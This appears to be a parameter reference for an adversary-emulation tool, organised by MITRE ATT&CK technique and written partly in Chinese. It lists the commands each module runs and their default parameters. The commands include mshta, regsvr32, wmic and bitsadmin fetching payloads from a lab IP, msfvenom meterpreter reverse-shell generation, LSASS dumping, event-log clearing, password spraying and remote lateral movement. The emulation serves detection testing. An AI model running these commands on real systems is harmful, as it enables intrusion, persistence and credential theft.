# playbook参数

## Execution

### T1047 - Windows Management Instrumentation

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | 使用System.Diagnostics .NET namespace 执行 `wmic.exe process call create {filePath}` |

#### Parameters

| **Parameter** | **Description** |
| ------------- | --------------- |
| `filePath`    | 可执行文件路径  |



### [T1059.001](https://attack.mitre.org/techniques/T1059/001/) - Command and Scripting Interpreter: PowerShell

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to execute the specifiedcommandlet:`powershell.exe -enc {command}` |
| 2             | This module uses the the System.Management.Automation .NET namespace to execute the specified command. |

#### Parameters

| **Parameter** | **Description**                                             |
| ------------- | ----------------------------------------------------------- |
| `command`     | The PowerShell commandlet to be executed in the simulation. |

### [T1059.003](https://attack.mitre.org/techniques/T1059/003/) Command and Scripting Interpreter: Windows Command Shell

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to execute the specifiedcommand:cmd.exe /c **command** |

#### Parameters

| **Parameter** | **Description**                                     |
| ------------- | --------------------------------------------------- |
| command       | The command shell to be executed in the simulation. |

### [T1059.005](https://attack.mitre.org/techniques/T1059/005/) Command and Scripting Interpreter: Visual Basic

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to execute the specifiedVB script:wscript.exe **filePath** |

#### Parameters

| **Parameter** | **Description**                       |
| ------------- | ------------------------------------- |
| filePath      | The local file path of the VB script. |

### [T1059.007](https://attack.mitre.org/techniques/T1059/007/) Command and Scripting Interpreter: JavaScript/JScript

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to execute the specifiedJS script:wscript.exe **file_path** |

#### Parameters

| **Parameter** | **Description**                       |
| ------------- | ------------------------------------- |
| filePath      | The local file path of the JS script. |

### [T1053.005](https://attack.mitre.org/techniques/T1053/005/) Scheduled Task/Job: Scheduled Task

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to create a scheduledtask:SCHTASKS /CREATE /SC DAILY /TN **taskName** /TR **taskPath** /ST 13:00 |

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| taskName      | The name of the task to be created.                          |
| taskPath      | The path of the binary to be executed by the scheduled task. |
| cleanup       | Bool parameter to delete the scheduled task after created.   |

### [T1569.002](https://attack.mitre.org/techniques/T1569/002/) System Services: Service Execution

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API CreateProcess to start the specified Windows service: <br />sc create {**serviceName**} binPath={**servicePath**} <br />net start **serviceName** |

#### Parameters

| **Parameter** | **Description**                                |
| ------------- | ---------------------------------------------- |
| servicePath   | 创建的服务的binpath                            |
| serviceName   | The name of the Windows service to be started. |





## Persistence

### [T1136.001](https://attack.mitre.org/techniques/T1136/001/) - Create Account: Local Account

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Win32 API NetUserAdd to create a local accountwith the specified parameters. |
| 2             | This module uses the Win32 API CreateProcess to create a local accountwith the specified parameters.net user **user** **password** /add |

#### Parameters

| **Parameter** | **Description**                                  |
| ------------- | ------------------------------------------------ |
| user          | The user to be created.                          |
| password      | The password to be used.                         |
| cleanup       | Bool parameter to delete the user after created. |

### [T1543.003](https://attack.mitre.org/techniques/T1543/003/) - Create or Modify System Process: Windows Service

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreateProcess Win32 API to execute `sc create $serviceName binpath=$servicePath type= own start= auto` |
| 2             | This module uses the Win32 API CreateProcess to create a WindowsService with the specified parameters. |

#### Parameters

| **Parameter**      | **Description**                                              |
| ------------------ | ------------------------------------------------------------ |
| serviceName        | The name of the Windows service to be created.               |
| servicePath        | The path of the binary that will be executed by the service. |
| serviceDisplayName | The service display name.                                    |
| cleanup            | Bool parameter to delete the Service after created.          |

### [T1547.001](https://attack.mitre.org/techniques/T1547/001/) - Boot or Logon Autostart Execution: Registry Run Keys

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the Microsoft.Win32 .NET namespace to create a Registry Key with the specified parameters. |
| 2             | This module uses the Win32 API CreateProcess to create a Registry Key with the specified parameters. **REG ADD HKCU/SOFTWARE/Microsoft/Windows/CurrentVersionRun /V BadApp /t REG_SZ /F /D C:WindowsTempxyz12345.exe** |

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| regPath       | 注册表路径，默认`HKCU/SOFTWARE/Microsoft/Windows/CurrentVersionRun` |
| regKey        | 注册表键，默认`BadApp`                                       |
| regValue      | 注册表值，默认`C:Windows\Temp\xyz12345.exe`                  |
| cleanup       | Bool parameter to delete the Service after created.          |

### [T1546.003](https://attack.mitre.org/techniques/T1546/003/) - Event Triggered Execution: Windows Management Instrumentation Event Subscription

This module uses the System.Management .NET namespace to create the main pieces of a WMI Event Subscription: an Event Filter, an Event Consumer and a FilterToConsumerBinding.

* Filter过滤器

  类型：`root\Subscription -Class __EventFilter`

```
Filter.QueryLanguage = "WQL"  
Filter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5  WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'" 
Filter.Name = "MaliciousWmiSubscription"  
Filter.EventNamespace = 'root\cimv2'
```

* Consumer

  类型CommandLineEventConsumer

```
Consumer.Name= "MaliciousWmiSubscription"
Consumer.CommandLineTemplate = "powershell.exe -nop -c $Payload"
```



#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the System.Management .NET namespace to create the main pieces of a WMI Event Subscription: an Event Filter, an Event Consumer and a FilterToConsumerBinding. |

#### Parameters

| **Parameter**       | **Description**                                              |
| ------------------- | ------------------------------------------------------------ |
| wmiSubscription     | WMI订阅名字，默认MaliciousWmiSubscription                    |
| targetInstance      | 目标进程，默认"notepad.exe"                                  |
| filterQuery         | 过滤器的query语句，默认`"SELECT * FROM __InstanceCreationEvent WITHIN 5  WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"` |
| consumerCommandLine | 事件触发执行的命令，默认`powershell.exe -nop -c calc`        |
| cleanup             | Bool parameter to delete the Service after created.          |

ps, 若targetInstance和filterQuery冲突，以filterQuery为准。



## Defense Evasion

### [T1055.002](https://attack.mitre.org/techniques/T1055/002/) - Process Injection: Portable Executable Injection

This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and CreateRemoteThread Win32 API functions to inject an innocuous shellcode.

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| filePath      | 将要注入进程的可执行文件位置，默认C:\\Windows\\system32\\notepad.exe |
| shellcode     | 注入的shellcode，默认执行"ping 127.0.0.1 -n 10"的shellcode   |

### [T1055.003](https://attack.mitre.org/techniques/T1055/003/) - Process Injection: Thread Execution Hijacking

This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and OpenThread Win32 API functions to inject an innocuous shellcode.

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| filePath      | 将要注入进程的可执行文件位置，默认C:\\Windows\\system32\\notepad.exe |
| shellcode     | 注入的shellcode，默认执行"ping 127.0.0.1 -n 10"的shellcode   |



### [T1055.004](https://attack.mitre.org/techniques/T1055/004/) - Process Injection: Asynchronous Procedure Call

This module uses the CreateProcess, OpenProcess, VirtualAllocEx, WriteProcessMemory and QueueUserAPC Win32 API functions to inject an innocuous shellcode.

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| filePath      | 将要注入进程的可执行文件位置，默认C:\\Windows\\system32\\notepad.exe |
| shellcode     | 注入的shellcode，默认执行"ping 127.0.0.1 -n 10"的shellcode   |



### [T1220](https://attack.mitre.org/techniques/T1220/) XSL - Script Processing

This module uses the CreateProcess Win32 API to execute

```
wmic.exe os get /FORMAT "$url”
```

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| url           | 下载恶意文件的url, 默认http://100.1.1.169:8080/T1218.010.xsl |



### [T1070.001](https://attack.mitre.org/techniques/T1070/001/) - Indicator Removal: Clear Windows Event Logs

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the System.Diagnostics .NET namespace to delete the Event Log. |
| 2             | This module uses the Win32 API CreateProcess to execute a specific command: `wevtutil.exe cl $eventType` |

#### Parameters

| **Parameter** | **Description**                                     |
| ------------- | --------------------------------------------------- |
| eventType     | 需要清理的事件类型：security/application/system之一 |





### [T1218.011](https://attack.mitre.org/techniques/T1218/011/) - Signed Binary Proxy Execution: Rundll32

This module uses the CreateProcess Win32 API to execute

```
rundll32.exe $filePath
```

#### Parameters

| **Parameter** | **Description**                                    |
| ------------- | -------------------------------------------------- |
| filePath      | 需要执行的dll文件路径，默认`.\files\T1218.011.dll` |



### [T1218.003](https://attack.mitre.org/techniques/T1218/003/) - Signed Binary Proxy Execution: CMSTP

This module uses the CreateProcess Win32 API to execute

```
cmstp.exe /s /ns $filePath
```

#### Parameters

| **Parameter** | **Description**                          |
| ------------- | ---------------------------------------- |
| filePath      | 执行文件路径，默认`.\file\T1218.003.txt` |



### [T1218.005](https://attack.mitre.org/techniques/T1218/005/) - Signed Binary Proxy Execution: Mshta

This module uses the CreateProcess Win32 API to execute

```
mshta.exe $url
```

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| url           | 下载恶意文件的url, 默认http://100.1.1.169:8080/T1218.005.hta |



### [T1140](https://attack.mitre.org/techniques/T1140/) - Deobfuscate/Decode Files or Information

This module uses the CreateProcess Win32 API to execute

```cmd
certutil.exe -decode $filePath xxxx.exe
```

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| filePath      | 需要解码的文件路径，默认.\file\T1140.txt，解码后的文件会保存在相同目录并将后缀改成exe |



### [T1218.010](https://attack.mitre.org/techniques/T1218/010/) - Signed Binary Proxy Execution: Regsvr32

This module uses the CreateProcess Win32 API to execute

```cmd
regsvr32.exe /u /n /s /i:$url scrobj.dll
```

下载payload.sct并执行，内容可参考下面

```xml
<?XML version="1.0"?>
<component id="TESTING">
<registration
  progid="TESTING"
  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
  <script language="JScript">
    <![CDATA[
      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe");
    ]]>
</script>
</registration>
</component>
```

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| url           | 下载恶意文件的url, 默认http://100.1.1.169:8080/T1218.010.sct |



### [T1218.009](https://attack.mitre.org/techniques/T1218/009/) - Signed Binary Proxy Execution: Regsvcs/Regasm

This module uses the CreateProcess Win32 API to execute

````cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U $filePath
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $filePath
````

dll文件可以自己生成，先生成C#的shellcode，然后使用csc.exe编译

```cmd
msfvenom –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.3   LPORT=4444 -f csharp -o xxxx.cs
C:Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll   /target:library /out:xxxx.dll /keyfile:key.snk xxxx.cs
```

#### Parameters

| **Parameter** | **Description**                                    |
| ------------- | -------------------------------------------------- |
| filePath      | 需要执行的dll文件路径，默认`.\files\T1218.009.dll` |



### [T1218.004](https://attack.mitre.org/techniques/T1218/004/) - Signed Binary Proxy Execution: InstallUtil

This module uses the CreateProcess Win32 API to execute

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfiles /LogToConsole=alse /U $filePath
```

exe文件生成方式：生成cs文件然后用csc.exe编译，InstallUtil.py项目地址：[https://github.com/khr0x40sh/WhiteListEvasion.git](https://link.zhihu.com/?target=https%3A//github.com/khr0x40sh/WhiteListEvasion.git)

```
msfvenom –platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.100.3   LPORT=4444 -f csharp -o xxxx.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319>csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:xxxx.exe /unsafe xxxx.cs
```

#### Parameters

| **Parameter** | **Description**                                    |
| ------------- | -------------------------------------------------- |
| filePath      | 需要执行的exe文件路径，默认`.\files\T1218.004.exe` |



### [T1197](https://attack.mitre.org/techniques/T1197/) - BITS Jobs

This module uses the CreateProcess Win32 API to execute

```cmd
bitsadmin.exe /transfer job /download /priority high $url $filePath
```

#### Parameters

| **Parameter** | **Description**                                          |
| ------------- | -------------------------------------------------------- |
| url           | 需要下载文件的url，默认http://100.1.1.169:8080/T1197.exe |
| filePath      | 保存文件路径，默认C:\Windows\Temp\T1197.exe              |



### T1134.004 - Access Token Manipulation: Parent PID Spoofing

调用`CreateProcess` API ，创建新进程的同时，自定义父进程标识符 （PPID）。

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| processName   | 父进程名，默认explorer                                       |
| filePath      | 要启动的子进程的二进制文件路径，默认C:\\WINDOWS\\System32\\notepad.exe |



## Credential Access

### [T1110.003](https://attack.mitre.org/techniques/T1110/003/) - Brute Force: Password Spraying

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the LogonUser Win32 API to test a single password across random users obtained via LDAP. |
| 2             | This module uses the WNetAddConnection2 Win32 API to test a single password across random users and random hosts obtained via LDAP. |

#### Parameters

| **Parameter**     | **Description**                                              |
| ----------------- | ------------------------------------------------------------ |
| user_target_type  | 1：指定某些用户，如果选择这个就需要填写下面的user_targets；**默认**<br />2：随机选择域内的用户，个数为user_target_total<br />3：随机生成user_target_total用户名<br />4：随机选择域内的user_target_total个管理账户<br />5：选择域内的所有账户 |
| user_targets      | 列出所有目标用户，默认为空                                   |
| user_target_total | 目标用户总数，默认为5                                        |
| protocol          | 密码喷洒协议，默认Kerberos                                   |
| sprayPassword     | 使用的密码，默认Passw0rd1                                    |
| task_sleep        | 间隔时间，默认0                                              |





### [T1558.003](https://attack.mitre.org/techniques/T1558/003/) - Steal or Forge Kerberos Tickets: Kerberoasting

This module uses the KerberosRequestorSecurityToken Class to obtain Kerberos service tickets.

#### Parameters

| **Parameter**     | **Description**                                              |
| ----------------- | ------------------------------------------------------------ |
| variation         | 1：为所有已识别的SPN请求服务票据<br />2：请求随机SPN的服务票证，user_target_total个<br />3：指定多个服务 |
| user_target_total | 默认5                                                        |
| task_sleep        | 间隔时间，默认0                                              |

### [T1003.001](https://attack.mitre.org/techniques/T1003/001/) - OS Credential Dumping: LSASS Memory

This module uses the GetProcessesByName and MiniDumpWriteDump Win32 API functions to create a memory dump of the lsass.exe process.

没有参数





## Discovery

### [T1049](https://attack.mitre.org/techniques/T1049/) - System Network Connections Discovery

This module uses the CreateProcess Win32 API to execute

```
netstat.exe
net.exe use
net.exe session
```



### [T1033](https://attack.mitre.org/techniques/T1033/) - System Owner/User Discovery

This module uses the CreateProcess Win32 API to execute

```
cmd /c whoami.exe
```



### [T1007](https://attack.mitre.org/techniques/T1007/) - System Service Discovery

This module uses the CreateProcess Win32 API to execute

```
net.exe start
tasklist.exe /svc
```





### [T1087.002](https://attack.mitre.org/techniques/T1087/002/) - Account Discovery: Domain Account

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreatePRocess Win32 API to execute:**net.exe user /domain** |
| 2             | `powershell.exe -enc  Get-ADUser -Filter * | Select-Object SamAccountNAme` |
| 3             | This module uses the Sytem.DirectoryServices .NET NameSpace to query a domain environment using LDAP. |





### [T1046](https://attack.mitre.org/techniques/T1046/) - Network Service Scanning

This module uses the System.Net.Sockets .NET namespace to scan ports on remote endpoints randomly picked using LDAP.

#### Parameters

| **Parameter**     | **Description**                                              |
| ----------------- | ------------------------------------------------------------ |
| host_target_type  | 1：列出所有需要探测的IP，即host_targets参数  **默认**<br />2：随机选取域内IP，需要填写目标总数host_target_total |
| host_targets      | 所有目标IP，默认为空                                         |
| host_target_total | 随机确定目标IP时候的总数，默认5                              |
| task_sleep        | 间隔时间，默认0                                              |
| ports             | 扫描的端口，默认{ 135, 139, 443, 445, 1433, 3306, 3389 }     |



### [T1087.001](https://attack.mitre.org/techniques/T1087/001/) - Account Discovery: Local Account

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreateProcess Win32 API to execute `net.exe user` |
| 2             | This module uses the CreateProcess Win32 API to execute `powershell.exe -enc Get-LocalUser`(base64编码前) |





### [T1016](https://attack.mitre.org/techniques/T1016/) - System Network Configuration Discovery

This module uses the CreateProcess Win32 API to execute

```
ipconfig.exe /all
```



### [T1083](https://attack.mitre.org/techniques/T1083/) - File and Directory Discovery

This module uses the CreateProcess Win32 API to execute

```
cmd.exe /c dir $path >> %temp%\download
cmd.exe /c C:\Users>> %temp%download
```

#### Parameters

| **Parameter** | **Description**         |
| ------------- | ----------------------- |
| filepath      | 想要查看的目录，默认C:\ |

### [T1135](https://attack.mitre.org/techniques/T1135/) - Network Share Discovery

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreateProcess Win32 API to execute `net share` |
| 2             | `net view \\ $target_hosts`                                  |
| 3             | This module uses the NetShareEnum Win32 API function to enumerate shared on remote endpoints randomly picked using LDAP，需要填写目标IP `$target_hosts`. |

#### Parameters

| **Parameter**     | **Description**                                              |
| ----------------- | ------------------------------------------------------------ |
| host_target_type  | 1：列出所有需要探测的IP，即host_targets参数  **默认**<br />2：随机选取域内IP，需要填写目标总数host_target_total |
| host_targets      | 所有目标IP，默认为空                                         |
| host_target_total | 随机确定目标IP时候的总数，默认5                              |
| task_sleep        | 间隔时间，默认0                                              |



### [T1018](https://attack.mitre.org/techniques/T1018/) - Remote System Discovery

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreatePRocess Win32 API to execute:`cmd.exe /c net view` |
| 2             | This module uses the CreatePRocess Win32 API to execute: `powershell.exe -enc Get-ADComputer -Filter  {{enabled -eq $true}} | Select-Object Name, DNSHostName, OperatingSystem, LastLogonDate` （这里展示了base64编码前的） |



### [T1482](https://attack.mitre.org/techniques/T1482/) - Domain Trust Discovery

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreatePRocess Win32 API to execute:`nltest.exe /domain_trusts ` |
| 2             | This module uses the CreatePRocess Win32 API to execute: `powershell.exe -enc Get-DomainTrusts` （这里展示了base64编码前的） |



### [T1201](https://attack.mitre.org/techniques/T1201/) - Password Policy Discovery

This module uses the CreateProcess Win32 API to execute

```
net accounts
net accounts /domain
```



### [T1069.001](https://attack.mitre.org/techniques/T1069/001/) - Permission Groups Discovery: Local Groups

This module uses the CreateProcess Win32 API to execute

```
net localgroup
net localgroup "Administrators"
```



### [T1069.002](https://attack.mitre.org/techniques/T1069/002/) - Permission Groups Discovery: Domain GroupsVariations

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses the CreateProcess Win32 API to execute `net group $groups /domain` |
| 2             | 执行`powershell.exe Get-AdGroup -Filter {{Name -like '$group'}} | Get-ADGroupMember | Select SamAccountName` |

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| groups        | 需要探测的所有组名，可以填写多个，默认为空，若不填写，Variation1会执行`net group /domain`，Variation2会执行`powershell.exe Get-AdGroup -Filter {{Name -like 'Domain Admins'}} | Get-ADGroupMember | Select SamAccountName` |



### [T1012](https://attack.mitre.org/techniques/T1012/) - Query Registry

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| regPath       | 需要查询的注册表，如果不填写，默认执行<br />`reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall`<br />`reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\`<br />`reg query HKLM\\System\\Currentcontrolset\\Service` |



### [T1518.001](https://attack.mitre.org/techniques/T1518/001/) - Software Discovery: Security Software Discovery

This module uses the CreateProcess Win32 API to execute

```
netsh advfirewall firewall show rule name=all
wmic / Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName / Format:List
```



### [T1082](https://attack.mitre.org/techniques/T1082/) - System Information Discovery

This module uses the the System.Management.Automation .NET namespace to execute the specified command.

```
cmd.exe /c systeminfo
```



### [T1124](https://attack.mitre.org/techniques/T1124/) - System Time Discovery

This module uses the CreateProcess Win32 API to execute

```
w32tm /tz
time /T
```



## Lateral Movement

### [T1021.006](https://attack.mitre.org/techniques/T1021/006/) - Remote Services: Windows Remote Management

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | Using powershell.exe to execute `Invoke-Command -ComputerName $target -ScriptBlock $command ` |
| 2             | This module uses System.Management.Automation .NET namespace to execute commands on randomly picked remote hosts using WinRM. |

#### Parameters

| **Parameter** | **Description**      |
| ------------- | -------------------- |
| command       | powershell执行的命令 |
| host_targets  | 所有目标IP，默认为空 |
| task_sleep    | 间隔时间，默认0      |

### [T1021.002](https://attack.mitre.org/techniques/T1021/002/) - Remote Services: SMB/Windows Admin Shares

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | This module uses System.Diagnostics.Process .NET namespace to execute commands on remote hosts |
| 2             | This module uses the Win32 API CreateService to create a  Service with the specified parameters. |
| 3             | This module uses the Win32 API ChangeServiceConfig to create a  Service with the specified parameters. |

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| host_targets  | 所有目标主机的IP，默认为空                                   |
| serviceName   | 需要创建的服务名，默认为T1021.002，也可以填写为"random"，会随机生成一个名字，在选择Variation3时候，请不要随机命名。 |
| servicePath   | 服务指向的文件路径，默认C:\\Windows\\System32\\calc.exe      |
| task_sleep    | 间隔时间，默认0                                              |
| cleanup       | Bool parameter to delete the scheduled task after created.（停止并删除服务） |



### [T1053 - Lateral Movement] 

T1053.005 - Scheduled Task本应该归属持久化，但是也能用在这里，使用这条case时请指定好

```
"tactic": "lateral movement"
```

执行命令

```
schtasks.exe create /s $target /sc ONCE /st 13:30 /tn $taskName  /tr $taskPath /rl HIGHEST /ru SYSTEM", , 
```

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| host_targets  | 所有目标主机的IP，默认为空                                   |
| taskName      | 需要创建的计划任务名，默认为"T1053-Lateral Movement，也可以填写为"random"，会随机生成一个名字 |
| taskPath      | 服务指向的文件路径，默认C:\\Windows\\System32\\calc.exe      |
| task_sleep    | 间隔时间，默认0                                              |
| cleanup       | Bool parameter to delete the scheduled task after created.（停止并删除服务） |

### [T1047 - Lateral Movement]

T1047 - Windows Management Instrumentation 属于执行战术，但是也能用在这里，使用这条case时请指定好

```
"tactic": "lateral movement"
```

#### Variations

| **Variation** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| 1             | System.Diagnostics.Process执行命令，`wmic.exe /node:$target process call create $command` |
| 2             | System.Management.ManagementClass 在远程主机创建Win32_Process执行命令 |

#### Parameters

| **Parameter** | **Description**                                              |
| ------------- | ------------------------------------------------------------ |
| host_targets  | 所有目标主机的IP，默认为空                                   |
| command       | 需要在远程主机上执行的命令，默认whoami                       |
| task_sleep    | 间隔时间，默认0                                              |
| cleanup       | Bool parameter to delete the scheduled task after created.（停止并删除服务） |